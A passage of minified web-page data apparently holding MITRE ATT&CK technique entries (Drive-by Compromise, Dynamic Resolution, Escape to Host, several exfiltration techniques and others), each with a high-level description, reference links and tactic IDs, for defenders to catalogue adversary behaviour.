Tickets",url:"https:\u002F\u002Fadsecurity.org\u002F?p=1588",description:"Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019."},{source_name:"Harmj0y Domain Trusts",url:"http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fa-guide-to-attacking-domain-trusts\u002F",description:"Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019."},{source_name:"Microsoft Operation Wilysupply",url:"https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2017\u002F05\u002F04\u002Fwindows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack\u002F",description:"Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019."},{source_name:"Microsoft GetAllTrustRelationships",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fdotnet\u002Fapi\u002Fsystem.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships",description:"Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019."}],tactics:[i]},{id:qn,"object-type":a,name:"Drive-by Compromise",description:"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F001'\u003EApplication Access Token\u003C\u002Fa\u003E.\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.shadowserver.org\u002F2012\u002F05\u002F15\u002Fcyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1528'\u003ESteal Application Access Token\u003C\u002Fa\u003Es, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2017\u002F11\u002F06\u002Foceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:qn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189"},{url:"http:\u002F\u002Fblog.shadowserver.org\u002F2012\u002F05\u002F15\u002Fcyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results\u002F",description:"Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic Web Compromises – Trusted Websites Serving Dangerous Results. Retrieved March 13, 2018.",source_name:"Shadowserver Strategic Web Compromise"},{source_name:"Volexity OceanLotus Nov 2017",description:"Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.",url:"https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2017\u002F11\u002F06\u002Foceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society\u002F"}],tactics:[q]},{id:by,"object-type":a,name:"Dynamic Resolution",description:"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1008'\u003EFallback Channels\u003C\u002Fa\u003E. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F09\u002Favast-distributes-malware.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F03\u002Fdissecting_one_ofap.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F12\u002F21\u002Fsednit-update-fancy-bear-spent-year\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:by,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568"},{url:qo,description:qp,source_name:qq},{url:qr,description:qs,source_name:qt},{source_name:qu,url:qv,description:qw},{source_name:qx,url:qy,description:qz}],tactics:[o],subtechniques:[qA,qC,qE]},{id:bz,"object-type":a,name:"Email Collection",description:"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",external_references:[{source_name:b,external_id:bz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1114"},{description:qG,url:qH,source_name:qI}],tactics:[m],subtechniques:[qJ,qL,qN]},{id:cI,"object-type":a,name:"Encrypted Channel",description:"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and\u002For generated within malware samples\u002Fconfiguration files.",external_references:[{source_name:b,external_id:cI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573"},{url:qP,description:qQ,source_name:qR},{url:qS,description:qT,source_name:qU},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[qV,qX]},{id:aQ,"object-type":a,name:"Endpoint Denial of Service",description:"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2014\u002F11\u002Foperation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and to support other malicious activities, including distraction\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ic3.gov\u002Fmedia\u002F2012\u002FFraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, hacktivism, and extortion.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fen\u002Fus\u002Fenterprise\u002Fmedia\u002Fsecurity_response\u002Fwhitepapers\u002Fthe-continued-rise-of-ddos-attacks.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpr\u002Fseven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2015\u002F03\u002Fmassive-denial-of-service-attack-on-github-tied-to-chinese-government\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor attacks attempting to saturate the providing network, see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1498'\u003ENetwork Denial of Service\u003C\u002Fa\u003E.\n",external_references:[{source_name:b,external_id:aQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499"},{external_id:"CAPEC-227",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F227.html"},{external_id:"CAPEC-131",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F131.html"},{external_id:"CAPEC-130",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F130.html"},{external_id:qZ,source_name:c,url:q_},{source_name:q$,url:ra,description:rb},{source_name:rc,url:rd,description:re},{source_name:rf,url:rg,description:rh},{source_name:ri,url:rj,description:rk},{source_name:"ArsTechnica Great Firewall of China",url:"https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2015\u002F03\u002Fmassive-denial-of-service-attack-on-github-tied-to-chinese-government\u002F",description:"Goodin, D.. (2015, March 31). Massive denial-of-service attack on GitHub tied to Chinese government. Retrieved April 19, 2019."},{source_name:at,url:au,description:av}],tactics:[j],subtechniques:[rl,rn,rp,rr]},{id:rt,"object-type":a,name:"Escape to Host",description:"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fget-started\u002Foverview\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, and utilizing a privileged container to run commands on the underlying host.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fstorage\u002Fbind-mounts\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F19\u002Fl\u002Fwhy-running-a-privileged-container-in-docker-is-a-bad-idea.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fcloud-security\u002Fwatch-your-containers-doki-infecting-docker-servers-in-the-cloud\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",external_references:[{source_name:b,external_id:rt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1611"},{source_name:"Docker Overview",url:"https:\u002F\u002Fdocs.docker.com\u002Fget-started\u002Foverview\u002F",description:"Docker. (n.d.). Docker Overview. Retrieved March 30, 2021."},{source_name:"Docker Bind Mounts",url:"https:\u002F\u002Fdocs.docker.com\u002Fstorage\u002Fbind-mounts\u002F",description:"Docker. (n.d.). Use Bind Mounts. Retrieved March 30, 2021."},{source_name:"Trend Micro Privileged Container",url:"https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F19\u002Fl\u002Fwhy-running-a-privileged-container-in-docker-is-a-bad-idea.html",description:"Fiser, D., Oliveira, A.. (2019, December 20). Why a Privileged Container in Docker is a Bad Idea. Retrieved March 30, 2021."},{source_name:"Intezer Doki July 20",url:"https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fcloud-security\u002Fwatch-your-containers-doki-infecting-docker-servers-in-the-cloud\u002F",description:"Fishbein, N., Kajiloti, M.. (2020, July 28). Watch Your Containers: Doki Infecting Docker Servers in the Cloud. Retrieved March 30, 2021."}],tactics:[u]},{id:bA,"object-type":a,name:"Establish Accounts",description:"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:bA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585"},{source_name:et,description:eu,url:ev},{source_name:ew,description:ex,url:ey},{url:ai,description:aj,source_name:ak}],tactics:[e],subtechniques:[ru,rw]},{id:s,"object-type":a,name:"Event Triggered Execution",description:"Adversaries may establish persistence and\u002For elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications\u002Fbinaries. \n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create\u002Fmodify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Fwp-windows-management-instrumentation.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F04\u002Funit42-new-iotlinux-malware-targets-dvrs-forms-botnet\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",external_references:[{source_name:b,external_id:s,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546"},{url:fp,description:fq,source_name:fr},{url:B,description:ee,source_name:ef},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F04\u002Funit42-new-iotlinux-malware-targets-dvrs-forms-botnet\u002F",description:"Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT\u002FLinux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.",source_name:"amnesia malware"}],tactics:[u,k],subtechniques:[ry,rD,rF,rH,rJ,rL,rN,rP,rR,rW,rY,r_,sa,sc,se]},{id:fs,"object-type":a,name:"Execution Guardrails",description:"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cyberscoop.com\u002Fkevin-mandia-fireeye-u-s-malware-nice\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local\u002Fexternal IP addresses.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F12\u002Fbreaking-the-rules-tough-outlook-for-home-page-attacks.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E. While use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",external_references:[{source_name:b,external_id:fs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1480"},{source_name:"FireEye Kevin Mandia Guardrails",url:"https:\u002F\u002Fwww.cyberscoop.com\u002Fkevin-mandia-fireeye-u-s-malware-nice\u002F",description:"Shoorbajee, Z. (2018, June 1). Playing nice? FireEye CEO says U.S. malware is more restrained than adversaries'. Retrieved January 17, 2019."},{source_name:"FireEye Outlook Dec 2019",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F12\u002Fbreaking-the-rules-tough-outlook-for-home-page-attacks.html",description:"McWhirt, M., Carr, N., Bienstock, D. (2019, December 4). Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774). Retrieved June 23, 2020."}],tactics:[d],subtechniques:[sm]},{id:bB,"object-type":a,name:"Exfiltration Over Alternative Protocol",description:"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP\u002FS, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and\u002For obfuscate these alternate channels. \n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048'\u003EExfiltration Over Alternative Protocol\u003C\u002Fa\u003E can be done using various common operating system utilities such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E\u002FSMB or FTP.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F10\u002Funit42-oilrig-malware-campaign-updates-toolset-and-expands-targets\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ",external_references:[{source_name:b,external_id:bB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048"},{source_name:"Palo Alto OilRig Oct 2016",description:"Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.",url:"http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F10\u002Funit42-oilrig-malware-campaign-updates-toolset-and-expands-targets\u002F"},{url:f,description:g,source_name:h}],tactics:[J],subtechniques:[so,sq,ss]},{id:su,"object-type":a,name:"Exfiltration Over C2 Channel",description:"Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",external_references:[{source_name:b,external_id:su,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1041"},{url:f,description:g,source_name:h}],tactics:[J]},{id:ft,"object-type":a,name:"Exfiltration Over Other Network Medium",description:"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1011",external_id:ft}],tactics:[J],subtechniques:[sv]},{id:fu,"object-type":a,name:"Exfiltration Over Physical Medium",description:"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1052",external_id:fu}],tactics:[J],subtechniques:[sx]},{id:cM,"object-type":a,name:"Exfiltration Over Web Service",description:"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL\u002FTLS encryption, giving adversaries an added level of protection.",external_references:[{source_name:b,external_id:cM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1567"}],tactics:[J],subtechniques:[sz,sB]},{id:sD,"object-type":a,name:"Exploit Public-Facing Application",description:"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2016-6662'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, standard services (like SMB\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cisecurity.org\u002Fadvisory\u002Fmultiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or SSH), network device administration and management protocols (like SNMP and Smart Install\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002FTA18-106A'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E), and any other applications with Internet accessible open sockets, such as web servers and related services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2014-7169'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Depending on the flaw being exploited this may include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1211'\u003EExploitation for Defense Evasion\u003C\u002Fa\u003E. \n\nIf an application is hosted on cloud-based infrastructure and\u002For is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1611'\u003EEscape to Host\u003C\u002Fa\u003E, or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.owasp.org\u002Findex.php\u002FCategory:OWASP_Top_Ten_Project'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcwe.mitre.org\u002Ftop25\u002Findex.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:sD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190"},{url:sE,description:sF,source_name:sG},{url:sH,description:sI,source_name:sJ},{source_name:oS,url:oT,description:oU},{source_name:K,url:L,description:M},{url:sK,description:sL,source_name:sM},{url:"https:\u002F\u002Fwww.owasp.org\u002Findex.php\u002FCategory:OWASP_Top_Ten_Project",description:"OWASP. (2018, February 23). OWASP Top Ten Project. Retrieved April 3, 2018.",source_name:"OWASP Top 10"},{source_name:"CWE top 25",url:"https:\u002F\u002Fcwe.mitre.org\u002Ftop25\u002Findex.html",description:"Christey, S., Brown, M., Kirby, D., Martin, B., Paller, A.. (2011, September 13). 2011 CWE\u002FSANS Top 25 Most Dangerous Software Errors. Retrieved April 10, 2019."}],tactics:[q]},{id:sN,"object-type":a,name:"Exploitation for Client Execution",description:"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002'\u003ESpearphishing Link\u003C\u002Fa\u003E. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as 